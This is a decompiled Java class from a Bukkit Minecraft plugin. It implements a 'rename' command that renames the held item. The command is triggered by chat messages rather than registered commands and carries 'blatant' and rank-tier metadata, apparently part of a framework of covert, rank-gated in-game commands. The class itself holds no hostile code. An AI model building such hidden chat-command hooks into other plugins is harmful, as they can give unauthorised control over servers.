package fr.body.ectasy.command.impl;

import fr.body.ectasy.command.AbstractCommand;
import fr.body.ectasy.command.CommandInfo;
import fr.body.ectasy.user.Rank;
import fr.body.ectasy.util.ChatUtil;
import org.bukkit.Material;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.inventory.meta.ItemMeta;

@CommandInfo(
   name = "rename",
   description = "Rename the item you are holding",
   blatant = false,
   rank = Rank.LITE
)
public class RenameItemCommand extends AbstractCommand {
   public RenameItemCommand() {
   }

   @Override
   public void execute(AsyncPlayerChatEvent var1, String var2, String[] var3) {
      String var4 = String.join(" ", var3).replace("&", "§");
      if (var1.getPlayer().getItemInHand() == null) {
         ChatUtil.sendChat(var1.getPlayer(), "You arent holding anything.");
      } else if (var1.getPlayer().getItemInHand().getType() == Material.AIR) {
         ChatUtil.sendChat(var1.getPlayer(), "You arent holding anything.");
      } else {
         ItemMeta var5 = var1.getPlayer().getItemInHand().getItemMeta();
         var5.setDisplayName(var4);
         var1.getPlayer().getItemInHand().setItemMeta(var5);
         var1.getPlayer().updateInventory();
         ChatUtil.sendChat(var1.getPlayer(), "Renamed the item");
      }
   }
}
